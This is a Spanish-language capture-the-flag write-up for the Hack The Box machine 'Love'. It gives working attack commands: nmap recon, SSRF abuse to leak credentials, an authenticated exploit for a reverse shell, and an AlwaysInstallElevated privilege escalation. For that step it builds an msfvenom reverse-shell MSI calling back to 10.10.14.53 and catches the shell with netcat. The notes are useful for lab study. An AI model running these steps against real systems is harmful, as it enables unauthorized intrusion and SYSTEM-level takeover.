## Summary

Tags: #SQLI #SSRF #SearchSploit #WinPEAS #AlwaysInstalledElevated #Msfvenom 

- IP -> 10.10.10.239
- Ports -> TCP (80, 135, 139, 445, 3306, 5000, 5440, 5986, 7680, 47001, 49664-70), UDP (idk)
- OS ->  Windows
- Services & Applications
    -  80 -> Apache httpd 2.4.46 

## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash 
❯ ping -c 1 IP              # Verificar conectividad con la maquina victima 
```

```bash 
❯ nmap -p- --open --min-rate 5000 -sS -vvv -Pn -n IP -oG AllPorts  # Escaneo de puertos a la IP

❯ nmap -p<Ports> -sCV IP -oN Targeted                              # Scripts y version de los puertos encontrados
```

```bash 
❯ whatweb IP       # Miramos las tecnologias que corren en la web 

❯ dirb IP          # Encontramos la ruta del admin
```

```bash 
❯ searchsploit votem system      # Mirar si existen exploits y probamos algunos exploits que nos llevan a la autenticacion en el 'votem system' como admin
```

```bash 
# Con el puerto 443 abierto podemos enumerar los dominios, esto con el fin de poderlo hacer de otra manera. 

❯ openssl s_client -connect IP:443     # Inspeccionar el certificado 
```

```bash 
# Encontramos en 'staging.love.htb' un escaner de archivos, el cual nos pide una URL. Por lo que colocamos la de nuestra maquina victima.

❯ python3 -m http.server 80      # Creamos un servidor para recibir la peticion 


# Despues, hacemos peticiones desde la web hacia su 'localhost' por lo que se puede observar que existe un SSRF. Hacemos peticiones a los demas puertos http y en el 5000 encontramos un usuario y una passwd. 

# Nos dirigimos al 'panel admin' y colocamos las credenciales 
```

## User

```bash 
# Una vez dentro del panel de 'votem system' buscamos el exploit en 'searchsploit' que nos ayudara a hacer una 'revershell' con un usuario autenticado. 
```

```bash 
# Una vez dentro buscamos la primer flag llamada 'user.txt' en el desktop del usuario 
```

```bash 
# Para buscar una forma de escalar [privilegios es usando la herramienta de 'WinPeas' desde la siguiente URL

❯ https://github.com/peass-ng/PEASS-ng/releases/tag/20240728-0f010225
```

```bash 
# Compartimos el archivo a la maquina Windows 


```
## Root

```bash 
# Depues de ejecutar el 'WinPeas', se observa que encuentra 'AlwaysInstalledElevated' donde:
	AlwaysInstalledElevated set to 1 in HKLM!
	AlwaysInstalledElevated set to 1 in HKCU!

# Podemos ir al recurso de 'hacktricks.xyz' para abusar de eso.
```

```bash 
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.53 LPORT=443 --platform windows -a x64 -f msi -o reverse.msi 

	# p = Payload 
	# platform = Plataforma de Windows 
	# a = Arquitectura 
	# f = Formato 
	# o = Output 

# Con esto nos crearemos una revershell en nuestra maquina de atacante para abusar del binario 'msi'
```

```bash 
# Compartimos el archivo a la maquina Windows 


```

```bash 
❯ msiexec /quiet /qn /i reverse.msi           # Ejecutamos de esta manera el archivo 'msi' en la maquina victima 
```

```bash 
❯ rlwrap nc -nlvp 443                          # Nos ponemos en escucha para recibir la revershell y ahora somos 'NT Authority\System' 
```